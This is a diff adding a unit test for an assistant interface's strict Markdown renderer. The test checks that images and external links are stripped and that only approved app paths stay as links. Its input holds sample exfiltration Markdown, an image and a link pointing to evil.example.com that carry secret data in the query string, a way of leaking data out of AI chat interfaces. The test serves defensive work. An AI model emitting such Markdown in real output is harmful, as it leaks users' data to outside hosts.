@@ -480,6 +480,17 @@ test("the thread's Markdown: remote images as placeholders, links through safePa
     assert.equal(assist.hostOf("/apps/x"), "");
 });
 
+test("a canvas's Markdown is strict: no image of any kind, no external link, only checked app paths", () => {
+    const html = assist.renderMarkdown(marked, [
+        "![p](https://evil.example.com/p?d=secret) ![local](/apps/static/logo.png) [docs](https://evil.example.com/?d=x) [Orders](/qapps/Orders)",
+    ].join("\n"), { strict: true });
+    assert.doesNotMatch(html, /<img|evil.example.com\/\?d|href="https/);
+    assert.match(html, /<span class="m-assist-image"[^>]*>Image: p \(evil.example.com\)<\/span>/);
+    assert.match(html, /<span class="m-assist-image"[^>]*>Image: local<\/span>/);
+    assert.match(html, /<a href="\/qapps\/Orders" data-md-link>Orders<\/a>/);
+    assert.match(html, / docs /);
+});
+
 test("the event stream: SSE frames with their ids, comments and retry left out, the rest kept for more", () => {
     const text = "retry: 2000\n\n: ping\n\nid: 3\nevent: text.chunk\ndata: {\"seq\":3,\"type\":\"text.chunk\",\"payload\":{\"messageId\":\"M1\",\"text\":\"a\"}}\n\n" +
         "event: text.delta\ndata: {\"seq\":null,\"type\":\"text.delta\",\"payload\":{\"text\":\"b\"}}\r\n\r\nid: 4\nevent: part.done\ndata: {\"seq\":4";
